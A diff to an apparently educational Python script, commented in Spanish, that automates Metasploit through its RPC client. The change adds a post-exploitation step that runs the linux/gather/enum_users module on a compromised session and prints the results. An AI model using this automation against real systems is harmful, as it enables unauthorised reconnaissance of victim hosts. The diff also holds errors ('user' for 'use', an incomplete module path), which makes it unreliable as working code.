@@ -70,13 +70,46 @@ def interact_with_session(client,session_id):
     except KeyboardInterrupt:
         print("saliendo de la sesión....")
 
+def post_exploitation(client,session_id):
+    console_id =client.console.console().cid
+    # Configurar y ejecutar el modulo de postsexplotacion que queremos utilizar
+
+    exploit_module = '/linux/gather/enum_users'
+
+    client.console.console(console_id).write(f'user {exploit_module}\n')
+
+    client.console.console(console_id).write(f'set SESSION {session_id}\n')
+
+    client.console.console(console_id).write('run\n')
+
+    time.sleep(20)
+    #esperar hasta que termine de ejecutarse el modulo
+
+    # Recuperar y mostrar los resultados
+
+    output = client.console.console(console_id).read()
+
+    print("Resultados del modulo:")
+
+    print(output['data'])
+
+    #limpiar y cerrar la consola
+
+    client.console.console(console_id).destroy()
+
+
+
+
+
 
 def main ():
     client = connect_metasploit()
     uuid=setup_and_run_exploit(client)
     session_id = get_session_id(client,uuid)
     if session_id:
-        interact_with_session(client,session_id)
+        post_exploitation(client,int(session_id))
+
+
 
 
 
